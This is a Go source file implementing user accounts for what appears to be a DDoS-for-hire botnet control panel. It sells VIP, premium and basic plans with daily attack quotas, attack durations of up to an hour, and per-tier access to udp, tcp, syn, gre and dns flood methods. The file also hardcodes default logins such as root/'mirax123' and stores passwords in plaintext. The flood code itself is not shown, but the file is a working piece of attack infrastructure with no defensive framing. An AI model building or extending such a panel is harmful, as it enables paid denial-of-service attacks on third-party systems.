package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

// User structure
type User struct {
	Username  string    `json:"username"`
	Password  string    `json:"password"`
	Plan      string    `json:"plan"`      // VIP, PREMIUM, USER
	CreatedAt time.Time `json:"created_at"`
	LastLogin time.Time `json:"last_login"`
	Admin     bool      `json:"admin"`
	Banned    bool      `json:"banned"`
	BanReason string    `json:"ban_reason,omitempty"`
	Attacks   int       `json:"attacks"`    // Attacks sent today
	MaxAttacks int      `json:"max_attacks"` // Daily limit
}

// UserManager handles all user operations
type UserManager struct {
	Users    map[string]*User
	Mutex    sync.RWMutex
	Filename string
}

// Global user manager
var userManager = &UserManager{
	Users:    make(map[string]*User),
	Filename: "data/users.json",
}

// Load users from file
func (um *UserManager) Load() error {
	um.Mutex.Lock()
	defer um.Mutex.Unlock()

	file, err := os.ReadFile(um.Filename)
	if err != nil {
		if os.IsNotExist(err) {
			// Create default users
			um.createDefaultUsers()
			return nil
		}
		return err
	}

	var users []*User
	if err := json.Unmarshal(file, &users); err != nil {
		return err
	}

	um.Users = make(map[string]*User)
	for _, user := range users {
		um.Users[user.Username] = user
	}

	return nil
}

// Save users to file
func (um *UserManager) saveToFile() error {
	um.Mutex.RLock()
	defer um.Mutex.RUnlock()

	var users []*User
	for _, user := range um.Users {
		users = append(users, user)
	}

	data, err := json.MarshalIndent(users, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(um.Filename, data, 0644)
}

// Create default users
func (um *UserManager) createDefaultUsers() {
	um.Mutex.Lock()
	defer um.Mutex.Unlock()

	um.Users = map[string]*User{
		"root": {
			Username:   "root",
			Password:   "mirax123",
			Plan:       "VIP",
			CreatedAt:  time.Now(),
			Admin:      true,
			Banned:     false,
			Attacks:    0,
			MaxAttacks: 0, // Unlimited
		},
		"user": {
			Username:   "user",
			Password:   "user123",
			Plan:       "USER",
			CreatedAt:  time.Now(),
			Admin:      false,
			Banned:     false,
			Attacks:    0,
			MaxAttacks: 50,
		},
		"premium": {
			Username:   "premium",
			Password:   "premium123",
			Plan:       "PREMIUM",
			CreatedAt:  time.Now(),
			Admin:      false,
			Banned:     false,
			Attacks:    0,
			MaxAttacks: 500,
		},
	}

	um.saveToFile()
}

// Authenticate user
func (um *UserManager) Login(username, password string) bool {
	um.Mutex.RLock()
	defer um.Mutex.RUnlock()

	user, exists := um.Users[username]
	if !exists {
		return false
	}

	if user.Banned {
		return false
	}

	if user.Password != password {
		return false
	}

	// Update last login
	user.LastLogin = time.Now()
	um.saveToFile()

	return true
}

// Get user by username
func (um *UserManager) GetUser(username string) *User {
	um.Mutex.RLock()
	defer um.Mutex.RUnlock()

	return um.Users[username]
}

// Check if user is admin
func (um *UserManager) IsAdmin(username string) bool {
	um.Mutex.RLock()
	defer um.Mutex.RUnlock()

	user, exists := um.Users[username]
	if !exists {
		return false
	}

	return user.Admin
}

// Check if user is banned
func (um *UserManager) IsBanned(username string) bool {
	um.Mutex.RLock()
	defer um.Mutex.RUnlock()

	user, exists := um.Users[username]
	if !exists {
		return false
	}

	return user.Banned
}

// Ban a user
func (um *UserManager) BanUser(username, reason string) bool {
	um.Mutex.Lock()
	defer um.Mutex.Unlock()

	user, exists := um.Users[username]
	if !exists {
		return false
	}

	user.Banned = true
	user.BanReason = reason
	um.saveToFile()
	return true
}

// Unban a user
func (um *UserManager) UnbanUser(username string) bool {
	um.Mutex.Lock()
	defer um.Mutex.Unlock()

	user, exists := um.Users[username]
	if !exists {
		return false
	}

	user.Banned = false
	user.BanReason = ""
	um.saveToFile()
	return true
}

// Add a new user
func (um *UserManager) AddUser(username, password, plan string, admin bool) bool {
	um.Mutex.Lock()
	defer um.Mutex.Unlock()

	if _, exists := um.Users[username]; exists {
		return false
	}

	maxAttacks := 50
	switch plan {
	case "VIP":
		maxAttacks = 0 // Unlimited
	case "PREMIUM":
		maxAttacks = 500
	case "USER":
		maxAttacks = 50
	}

	um.Users[username] = &User{
		Username:   username,
		Password:   password,
		Plan:       plan,
		CreatedAt:  time.Now(),
		Admin:      admin,
		Banned:     false,
		Attacks:    0,
		MaxAttacks: maxAttacks,
	}

	um.saveToFile()
	return true
}

// Remove a user
func (um *UserManager) RemoveUser(username string) bool {
	um.Mutex.Lock()
	defer um.Mutex.Unlock()

	if _, exists := um.Users[username]; !exists {
		return false
	}

	delete(um.Users, username)
	um.saveToFile()
	return true
}

// Get all users
func (um *UserManager) GetAllUsers() []*User {
	um.Mutex.RLock()
	defer um.Mutex.RUnlock()

	var users []*User
	for _, user := range um.Users {
		users = append(users, user)
	}
	return users
}

// Reset daily attack counts
func (um *UserManager) ResetDailyAttacks() {
	um.Mutex.Lock()
	defer um.Mutex.Unlock()

	for _, user := range um.Users {
		user.Attacks = 0
	}
	um.saveToFile()
}

// Increment attack count for user
func (um *UserManager) IncrementAttacks(username string) bool {
	um.Mutex.Lock()
	defer um.Mutex.Unlock()

	user, exists := um.Users[username]
	if !exists {
		return false
	}

	// Check if reached limit
	if user.MaxAttacks > 0 && user.Attacks >= user.MaxAttacks {
		return false
	}

	user.Attacks++
	um.saveToFile()
	return true
}

// Get user's plan info
func (um *UserManager) GetPlanInfo(username string) string {
	um.Mutex.RLock()
	defer um.Mutex.RUnlock()

	user, exists := um.Users[username]
	if !exists {
		return "USER"
	}

	return user.Plan
}

// Get max duration for user's plan
func (um *UserManager) GetMaxDuration(username string) int {
	um.Mutex.RLock()
	defer um.Mutex.RUnlock()

	user, exists := um.Users[username]
	if !exists {
		return 300
	}

	switch user.Plan {
	case "VIP":
		return 3600
	case "PREMIUM":
		return 1200
	default:
		return 300
	}
}

// Check if method is allowed for user's plan
func (um *UserManager) IsMethodAllowed(username, method string) bool {
	um.Mutex.RLock()
	defer um.Mutex.RUnlock()

	user, exists := um.Users[username]
	if !exists {
		return false
	}

	switch user.Plan {
	case "VIP":
		return true
	case "PREMIUM":
		// Premium can't use some methods
		blocked := []string{"gre", "dns"}
		for _, m := range blocked {
			if method == m {
				return false
			}
		}
		return true
	default: // USER
		// USER can only use basic methods
		allowed := []string{"udp", "tcp", "syn"}
		for _, m := range allowed {
			if method == m {
				return true
			}
		}
		return false
	}
}

// Show users to admin
func showUsers(conn net.Conn, admin bool) {
	if !admin {
		conn.Write([]byte("Permission denied.\n"))
		return
	}

	userManager.Load()
	users := userManager.GetAllUsers()

	if len(users) == 0 {
		conn.Write([]byte("\nNo users found.\n\n"))
		return
	}

	conn.Write([]byte(fmt.Sprintf("\n%-15s %-12s %-10s %-10s %-8s\n", "Username", "Plan", "Attacks", "Max", "Admin")))
	conn.Write([]byte("--------------------------------------------------------\n"))

	for _, user := range users {
		adminStr := "No"
		if user.Admin {
			adminStr = "Yes"
		}
		bannedStr := ""
		if user.Banned {
			bannedStr = " [BANNED]"
		}
		conn.Write([]byte(fmt.Sprintf("%-15s %-12s %-10d %-10d %-8s%s\n",
			user.Username, user.Plan, user.Attacks, user.MaxAttacks, adminStr, bannedStr)))
	}

	conn.Write([]byte("\n"))
}

// ==================== AUTH FUNCTIONS FOR MAIN.GO ====================

// authLogin - authenticate user
func authLogin(username, password string) bool {
	userManager.Load()
	return userManager.Login(username, password)
}

// getMaxDuration - get max duration for user
func getMaxDuration(username string) int {
	userManager.Load()
	return userManager.GetMaxDuration(username)
}

// isMethodAllowed - check if method is allowed
func isMethodAllowed(username, method string) bool {
	userManager.Load()
	return userManager.IsMethodAllowed(username, method)
}

// incrementAttacks - increment attack count
func incrementAttacks(username string) bool {
	userManager.Load()
	return userManager.IncrementAttacks(username)
}

// isAdmin - check if user is admin
func isAdmin(username string) bool {
	userManager.Load()
	return userManager.IsAdmin(username)
}